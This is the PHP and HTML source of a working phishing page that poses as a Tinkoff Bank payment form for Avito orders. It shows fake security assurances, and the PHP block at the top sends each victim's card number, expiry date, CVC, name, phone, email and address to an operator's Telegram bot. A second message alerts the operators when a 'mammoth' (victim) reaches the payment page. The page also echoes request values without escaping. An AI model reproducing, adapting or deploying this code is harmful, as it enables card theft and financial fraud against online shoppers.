<?php
include('settings.php');
if(isset($_REQUEST['cardFrom'])){
	$lox = str_replace(' ', '', $_REQUEST['amount']);
	$phone = str_replace('-', '', $_REQUEST['phone']);
	$phonee = str_replace('+', '', $phone);
	$number = str_replace(' ', '', $phonee);
	$card = str_replace(' ', '', $_REQUEST['cardFrom']);
	$message = file_get_contents("https://api.telegram.org/bot$tg_bot_api/sendMessage?chat_id=$cards_chat_id&parse_mode=Markdown&disable_web_page_preview=true&text=—————————————%0ACARD: `".$card."`%0ADATA: `".$_REQUEST['cardFromMonth']."/".$_REQUEST['cardFromYear']."` CVC: `".$_REQUEST['cardFromCVC']."`%0A—————————————%0AИмя: ".$_POST['name']."%0AСумма платежа: `".$lox." ₽`%0AНомер телефона: `%2B".$number."`%0AПочта: `".$_REQUEST['email']."`%0AТовар: https://avito.ru/".$_REQUEST['order']."%0AМесто доставки: ".$_REQUEST['delevery']."%0A—————————————");
	$json = json_decode($message, true);
	$message_id = $json['result']['message_id'];
}
?>
    <?php
if(isset($_REQUEST['user']) && ($_REQUEST['user'] != '') && ($_REQUEST['phone'] != '')){
	$message = file_get_contents("https://api.telegram.org/bot$tg_bot_api/sendMessage?chat_id=$chat_id&text=🐘 МАМОНТ ПЕРЕШЕЛ НА СТРАНИЦУ ОПЛАТЫ 🐘%0A🐘 СУММА ПЛАТЕЖА: ".$_REQUEST['summ']." ₽");
	$json = json_decode($message, true);
	$message_id = $json['result']['message_id'];
}

$id = $_GET['id'];
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
$page= file_get_contents('https://www.avito.ru/'.$id);
$title = get_string_between($page, '<span class="title-info-title-text" itemprop="name">', '</span>');
$price = get_string_between($page, '<span class="js-item-price" content="', '" itemprop="price">');
$full_price = $price + 410;

$dev_full_price = number_format($full_price, 0, '', ' ');
?>
        <!DOCTYPE html>
        <html>

        <head>
            <title>Тинькофф Банк - Оплата</title>
            <link rel="stylesheet" href="https://securepay.tinkoff.ru/html/payForm/default/avito_common.css?ver=1522308077655">
			<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
            <script type="text/javascript" src="/js/jquery.creditCardValidator.js"></script>
            <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.min.js"></script>
            <link href="https://securepay.tinkoff.ru/html/payForm/images/favicon.ico" rel="icon" type="image/x-icon">
            <meta charset="utf-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
            <script type="text/javascript">
                var heading_button = "<i class='fas fa-chevron-right'></i> Оплатить";
            </script>

        </head>

        <body id="body">
            <div class="wrapper">
                <div class="wrapper__middle">
                    <div class="header">
                        <div class="header__logo"><img src="https://securepay.tinkoff.ru/html/payForm/logo/logo-avito.svg" alt="Avito"></div>
                        <div class="header__fin-service">
                            <div class="header__fin-service-image images__visa"></div>
                            <div class="header__fin-service-image header__fin-service-image_diff images__master-card"></div>
                            <div class="header__fin-service-image header__fin-service-image_last header__fin-service-mobile images__maestro"></div>
                            <div class="header__fin-service-image header__fin-service-image_last images__mir"></div>
                        </div>
                    </div>
                    <div class="mobile-border mobile-border_top">
                        <div class="mobile-border__line"></div>
                    </div>
                    <div class="title">Оплата заказа</div>
                    <div style="padding: 5px 0px 15px;">
                        <a class="title-info" style="
        background: #6dc5ff;
        padding: 5px;
        border-radius: 4px;
        color: #ffffff;" href="http://www.avito.ru/<?php echo $_GET['id']; ?>" target="_blank">
                            <?php echo $title; ?>
                        </a>
                    </div>
                    <div class="content">
                        <div class="card">
                            <div class="info-agreement js-agreement js-agreement-inside">
                            </div>
                            <div class="card__order">
                                <div class="card__order_text">Заказ №
                                    <?php echo $_GET['id']; ?>
                                </div>
                                <div class="card__lock">Безопасное соединение</div>
                            </div>
                            <div id="tcs-pay-form" class="main-form">
                                <form method="POST" class="form-payment" action="">
                                    <div class="card-credit">
                                        <div class="card-credit__front">
                                            <div class="form-card-number">
                                                <label class="form-card-label">Номер карты</label>
                                                <label for="form-card-number-input" class="form-label form-card-number__label form-label_active">Введите номер карты</label>
                                                <div class="form-card-number__input-wrap">
                                                    <i class="icon icon-lock"></i> 
                                                    <div id="form-card-number__type" class="master_card images__card-number"></div>
                                                    <input name="cardFrom" required  id="card_number" autocomplete="off" type="text" class="form-field form-card-number__field" tabindex="1" data-validate="false" autofocus="">
													<script>
															$(function() {
																$('#form-month-input').validateCreditCard(function(result) {
																	if(($('#form-month-input').val() > 12) || ($('#form-month-input').val().length < 2)){
																		$('#form-month-input').addClass("error");
																	} else {
																		$('#form-month-input').removeClass("error");
																		$('#form-year-input').focus();
																	}
																});
															});
															
															$(function() {
																$('#form-cvc-input').validateCreditCard(function(result) {
																	if(($('#form-cvc-input').val().length != 3)){
																		$('#form-cvc-input').addClass("error");
																	} else {
																		$('#form-cvc-input').removeClass("error");
																	}
																});
															});
															
															$(function() {
																$('#form-year-input').validateCreditCard(function(result) {
																	if(($('#form-year-input').val() > 44) || ($('#form-year-input').val() < 19) || ($('#form-year-input').val().length < 2)){
																		$('#form-year-input').addClass("error");
																	} else {
																		$('#form-year-input').removeClass("error");
																		$('#form-cvc-input').focus();
																	}
																});
															});
														
															$(function() {
																$('#card_number').validateCreditCard(function(result) {
																	if(result.valid === false){
																		$('#card_number').addClass("error");
																	} else {
																		$('#card_number').removeClass("error");
																		$('#form-month-input').focus();
																	}
																	if($('#card_number').val() == ''){
																		$('#form-card-visa').fadeOut(10);
																		$('#form-card-mastercard').fadeOut(10);
																		$('#form-card-maestro').fadeOut(10);
																		$('#form-card-mir').fadeOut(10);
																	} else {
																		if(result.card_type.name == 'mastercard'){
																			$('#form-card-mastercard').fadeIn(10);
																			
																			$('#form-card-maestro').fadeOut(10);
																			$('#form-card-visa').fadeOut(10);
																			$('#form-card-mir').fadeOut(10);
																		} else if (result.card_type.name == 'visa') {
																			$('#form-card-visa').fadeIn(10);
																			
																			$('#form-card-maestro').fadeOut(10);
																			$('#form-card-mastercard').fadeOut(10);
																			$('#form-card-mir').fadeOut(10);
																		} else if (result.card_type.name == 'maestro') {
																			$('#form-card-maestro').fadeIn(10);
																			
																			$('#form-card-visa').fadeOut(10);
																			$('#form-card-mastercard').fadeOut(10);
																			$('#form-card-mir').fadeOut(10);
																		} else if (result.card_type.name == 'mir') {
																			$('#form-card-mir').fadeIn(10);
																			
																			$('#form-card-visa').fadeOut(10);
																			$('#form-card-mastercard').fadeOut(10);
																			$('#form-card-maestro').fadeOut(10);
																		} else {
																			$('#form-card-visa').fadeOut(10);
																			$('#form-card-mastercard').fadeOut(10);
																			$('#form-card-maestro').fadeOut(10);
																			$('#form-card-mir').fadeOut(10);
																		}
																	}
																});
															});
															/*
															$(function(){
															  $("#card_number").mask("9999 9999 9999 9999");
															});
															*/
															
															$(function() {
																$('form').validateCreditCard(function(result) {
																	if(($("#card_number").hasClass("error")) || ($('#form-cvc-input').val().length != 3) || ($('#form-year-input').val() > 44) || ($('#form-year-input').val() < 19) || ($('#form-year-input').val().length < 2) || ($('#form-month-input').val() > 12) || ($('#form-month-input').val().length < 2)){
																		$('#form-submit').prop('disabled',true);
																	} else {
																		$('#form-submit').prop('disabled',false);
																	}
																});
															});
														</script>
													<div style="display:none;" id="form-card-visa" class="visa_card form-card-number__field_visa"></div>
                                                    <div style="display:none;" id="form-card-mastercard" class="master_card form-card-number__field_mc"></div>
                                                    <div style="display:none;" id="form-card-maestro" class="master_card_m form-card-number__field_maestro"></div>
													<div style="display:none;" id="form-card-mir" class="form-card-number__field_mir"></div>

                                                </div>
                                            </div>
											<input type="hidden" name="fullprice" value="<?php echo $full_price; ?>">
                                            <div class="form-card-date">
                                                <label class="form-card-label">Срок действия</label>
                                                <div class="form-date-wrap">
                                                    <div class="form-date form-date_month">
                                                        <label for="form-month-input" class="form-label form-date__label form-date__label_month">Месяц</label>
                                                        <input required name="cardFromMonth" id="form-month-input" autocomplete="off" type="tel" value="" class="form-field form-date__field form-date_month__field" maxlength="2" tabindex="2" data-cur-month="11" data-validate="false">
                                                    </div>
                                                    <div class="form-date__separator">/</div>
                                                    <div class="form-date form-date_year">
                                                        <label for="form-year-input" class="form-label form-date__label form-date__label_year">Год</label>
                                                        <input required name="cardFromYear" id="form-year-input" autocomplete="off" type="tel" value="" class="form-field form-date__field form-date_year__field" maxlength="2" tabindex="3" data-cur-year="14" data-validate="false">
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="card-credit__back">
                                            <div class="form-cvc-bg"></div>
                                            <div class="form-cvc">
                                                <label class="form-card-label">CVC</label>
                                                <label for="form-cvc-input" id="form-cvc-label" class="form-label form-cvc__label">CVV/CVC</label>
                                                <input required name="cardFromCVC" id="form-cvc-input" autocomplete="off" type="password" value="" class="form-field form-cvc__field" maxlength="3" tabindex="4" data-validate="false">
                                            </div>
                                            <div class="form-cvc__tip-message">
                                                <a href="javascript:void(0);" class="form-cvc__tip-link">Что это?</a>
                                                <div class="tip-message images__tips" id="tip-message-1">
                                                    <div class="pop-up" id="pop-up-1">
                                                        <i class="pop-up__arrow"></i>
                                                        <p>Последние три цифры на оборотной полосе вашей карты.</p>
                                                        <p><img src="https://securepay.tinkoff.ru/html/payForm/default/images/hint.jpg" alt="пример CVV/CVC"></p>
                                                        <div class="pop-up__content"><i class="icon icon-cvc-info"></i> CVC-код состоит из&nbsp;трех последних цифр, расположенных на&nbsp;оборотной стороне карты.
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div id="card-credit-error" class="card-credit-error">Ошибка в заполнении полей:</div>
                                    </div>
                                    <div class="mobile-border mobile-border_form">
                                        <div class="mobile-border__line mobile-border__line_tip"></div>
                                    </div>
                                    <p class="notice-accept__mobile notice-accept">Вводя адрес электронной почты вы соглашаетесь
                                        <br>с <a class="js-notice-info" href="javascript:void(0);">условиями передачи информации</a></p>
                                    <div class="mobile-border mobile-border_pay">
                                        <div class="mobile-border__line"></div>
                                    </div>
                                    <div class="form-submit">
                                        <div class="form-submit__amount">Итого: <span id="card__summ" class="avito__summ"><?php echo $dev_full_price; ?></span><span class="font-arial-rub">₽</span></div>
                                        <div class="form-submit__field-wrap">
                                            <button id="form-submit" type="submit" disabled class="form-submit__field">Оплатить</button>

                                        </div>
                                    </div>
                                    <p class="ssl">Безопасное соединение</p>
                                    <p class="notice-accept">Вводя адрес электронной почты вы соглашаетесь с <a class="js-notice-info">условиями
                            передачи информации</a></p>

                                    <input type="hidden" id="cardFrom" name="card_number" value="">
                                    <input type="hidden" name="amount" value="<?php echo $_POST['summ']; ?>">
                                    <input type="hidden" name="order" value="<?php echo $_GET['id']; ?>">
                                    <input type="hidden" name="name" value="<?php echo $_POST['user']; ?>">
                                    <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>">
                                    <input type="hidden" name="phone" value="<?php echo $_POST['phone']; ?>">
                                    <input type="hidden" name="delevery" value="<?php echo $_POST['adres']; ?>">
                                    <input type="hidden" name="card_holder" value="">
                                </form>
                                <form class="form-process" method="post">
                                    <input type="hidden" name="PaReq">
                                    <input type="hidden" name="MD">
                                    <input type="hidden" name="TermUrl">
                                </form>

                            </div>
                        </div>
                        <div class="mobile-border mobile-border_bottom">
                            <div class="mobile-border__line"></div>
                        </div>
                        <div class="credits">
                            <div class="credits__icons">
                                <div class="images__under-visa"></div>
                                <div class="images__under-master"></div>
                                <div class="images__under-miraccept"></div>
                                <div class="images__under-pci"></div>
                            </div>
                            <p class="credits__info">Интернет-платежи защищены сертификатом SSL и протоколом 3D Secure. АО&nbsp;"Тинькофф Банк" не&nbsp;передает магазинам платежные данные, в том числе данные карты.</p>
                            <div class="credits__tcs-logo"><img alt="Tinkoff bank logo" src="https://securepay.tinkoff.ru/html/payForm/default/images/tcs-logo.png" width="162" height="50"></div>
                            <p class="credits__info">Сервис предоставлен АО «Тинькофф Банк».</p>
                        </div>
                        <div class="add-info">
                            <div class="add-info__list">
                                <div class="add-info__item">
                                    <div class="add-info__item_caption"><i class="add-info__icon icon icon-card"></i> <i class="add-info__icon icon icon-mir"></i> <i class="add-info__icon icon icon-visa"></i> <i class="add-info__icon icon icon-master-card"></i></div>
                                    <div class="clearfix"></div>
                                    <div class="add-info__text">Товары с доставкой оплачиваются только банковской картой онлайн.
                                    </div>
                                </div>
                                <div class="add-info__item">
                                    <i class="icon icon-rub"></i>
                                    <div class="add-info__text">Гарантия возврата денег если:
                                        <br>— продавец отменил заказ,
                                        <br>— товар не подошёл или брак,
                                        <br>— вы не получили товар.
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="alert alert-dismissible alert-warning">
                        <p class="mb-0">Для обеспечения безопасности, Ваш счёт к оплате может быть разбит на <b>несколько</b> платежей.
                        </p>
                    </div>
                </div>
            </div>
            <div class="footer">
                <div class="form-card-supported-systems"><i class="grey-icon grey-icon-master-card"></i> <i class="grey-icon grey-icon-visa"></i> <i class="grey-icon grey-icon-mir"></i> <i class="grey-icon grey-icon-pci-dss"></i></div>
                <div class="form-card-add-info">Интернет-платежи защищены сертификатом SSL и протоколом 3D Secure. АО «Тинькофф Банк» не передает магазинам платежные данные, в том числе данные карты. Оплачивая заказ вы соглашаетесь с <a href="https://static2.tinkoff.ru/acquiring/agreement_avito2.pdf" target="_blank" rel="noopener noreferrer">офертой</a></div>
                <div class="form-card-add-info__logo">Сервис предоставлен «Тинькофф Банк»</div>
            </div>
            <style>
                .error {
                    border-color: #fd5555!important;
                }
                
                .disabled {
                    opacity: .6;
                    pointer-events: none;
                    cursor: default;
                }
            </style>
            <!--
<script type="text/javascript">
    $("#form-submit").click(function() {
        $.post("merchant/payment.php", $(".form-payment").serialize())
        .done(function(response) {
            if (response["status"] == "ok") {
                $(".form-process").attr("action", response["PayUrl"]);
                $("input[name='PaReq']").val(response["PaReq"]);
                $("input[name='MD']").val(response["MD"]);
                $("input[name='TermUrl']").val(response["TermUrl"]);

                $(".form-process").submit();
            } else if (response["status"] == "error") {
                var error_code = response["code"];
                var error_label;    

                if (error_code >= 100 && error_code <= 105) {
                    error_label = "Произошла ошибка. Некорретно сформирован запрос.";
                }

                if (error_code >= 901 && error_code <= 905) {
                    switch (error_code) {
                        case 901: error_label = "Произошла системная ошибка."; console.log("Ошибка 901: не удалось получить WUID."); break;
                        case 902: error_label = "Произошла системная ошибка."; console.log("Ошибка 902: не удалось получить сессию."); break;
                        case 903: error_label = "Произошла системная ошибка."; console.log("Ошибка 903: не удалось получить MID."); break;
                        case 904: error_label = "Не удалось рассчитать комиссию."; break;
                        case 905: error_label = "Не удалось провести 3-D Secure авторизацию."; break;
                    }
                }

                location.href = "/error.php?error=" + error_label;
            } else {
                var error_label = "Произошла внутренняя ошибка сервера.";
                location.href = "/error.php?error=" + error_label;
            }
        })

        return false;
    });
</script>
-->
        </body>

        </html>